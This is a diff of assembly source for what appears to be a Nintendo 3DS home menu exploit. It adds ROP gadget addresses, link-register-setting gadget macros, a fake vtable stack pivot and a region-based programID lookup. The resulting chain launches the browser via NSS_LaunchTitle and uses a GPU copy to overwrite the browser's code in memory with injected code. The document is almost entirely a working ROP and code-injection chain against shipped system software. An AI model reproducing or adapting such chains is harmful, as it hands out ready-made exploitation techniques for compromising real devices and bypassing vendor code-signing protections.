@@ -21,10 +21,18 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
 #define ROP_POPPC 0x10203c
 #define POP_R4LR_BXR1 0x0011df68 //"pop {r4, lr}" "bx r1"
+#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037fc//"ldr r1, [r5, r4, lsl #2]" "ldr r2, [r0]" "ldr r2, [r2, #20]" "blx r2"
+#define POP_R4R8LR_BXR2 0x00133f8c //"pop {r4, r5, r6, r7, r8, lr}" "bx r2"
+
+#define CFGIPC_SecureInfoGetRegion 0x00136ea4 //inr0=u8* out
 #else
 #define ROP_LOADR4_FROMOBJR0 0x10b64c
 #define ROP_POPPC 0x102028
 #define POP_R4LR_BXR1 0x0011dda4
+#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037d8
+#define POP_R4R8LR_BXR2 0x00136d5c
+
+#define CFGIPC_SecureInfoGetRegion 0x00139d0c
 #endif
 
 #if SYSVER == 93
@@ -110,14 +118,40 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define ROP_BXR1 POP_R4LR_BXR1+4
 
+#if NEW3DS==0
+#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
+#else
+#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
+#endif
 
-.macro CALL_GXCMD4 srcadr, dstadr, cpysize
+.macro ROP_SETLR lr
 .word POP_R1PC
 .word ROP_POPPC @ r1
 
 .word POP_R4LR_BXR1
 .word 0 @ r4
-.word POP_R2R6PC @ lr
+.word \lr
+.endm
+
+.macro ROP_SETLR_OTHER lr
+.word POP_R2R6PC
+.word ROP_POPPC @ r2
+.word 0 @ r3
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+
+.word POP_R4R8LR_BXR2
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+.word 0 @ r7
+.word 0 @ r8
+.word \lr
+.endm
+
+.macro CALL_GXCMD4 srcadr, dstadr, cpysize
+ROP_SETLR POP_R2R6PC
 
 .word POP_R0PC
 .word \srcadr @ r0
@@ -179,30 +213,76 @@ vtable:
 .word 0, 0 @ vtable+0
 .word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
+.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
 
 .space ((vtable + 0x100) - .)
 
 .space ((_start + 0x4000) - .) @ Base the stack at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
+
+tmpdata:
+
+nss_outprocid:
+.word 0
+
+#if NEW3DS==0
+#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
+#else
+#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
+#endif
+
+nsslaunchtitle_programidlow_list:
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN 
+
+.space 0x400
 
 ropstackstart:
 
 //Overwrite the top-screen framebuffers.
 CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
 
-.word POP_R1PC
-.word ROP_POPPC @ r1
-
-.word POP_R4LR_BXR1
-.word 0 @ r4
-.word POP_R2R6PC @ lr
+ROP_SETLR POP_R2R6PC
 
 .word POP_R0PC
-.word HEAPBUF @ r0, out procid*
+.word HEAPBUF + (region_outval - _start) @ r0
+
+.word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.
+
+.word 0 @ r2
+.word 0 @ r3
+region_outval:
+.word 0 @ r4
+.word HEAPBUF + (nsslaunchtitle_programidlow_list - _start) @ r5
+.word 0 @ r6
+
+.word POP_R0PC
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)
+
+ROP_SETLR_OTHER ROP_POPPC
+
+.word POP_R0PC
+
+.word HEAPBUF + (nsslaunchtitle_regload_programidlow - _start) @ r0
+
+.word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.
+
+ROP_SETLR POP_R2R6PC
+
+.word POP_R0PC
+.word HEAPBUF + (nss_outprocid - _start)  @ r0, out procid*
 
 @ r1 isn't used by NSS_LaunchTitle so no need to set it here.
 
 .word POP_R2R6PC
-.word 0x00009402 @ r2, programID low
+nsslaunchtitle_regload_programidlow:
+.word 0 @ r2, programID low (overwritten by the above ROP)
 .word 0x00040030 @ r3, programID high
 .word 0 @ r4
 .word 0 @ r5
@@ -217,14 +297,9 @@ CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
 .word 0 @ r6
 
 //Overwrite the start of the browser .text with the below code.
-CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), 0x36500000, (codedataend-codedatastart)
+CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, (codedataend-codedatastart)
 
-.word POP_R1PC
-.word ROP_POPPC @ r1
-
-.word POP_R4LR_BXR1
-.word 0 @ r4
-.word ROP_POPPC @ lr
+ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
 .word 0x0 @ r0
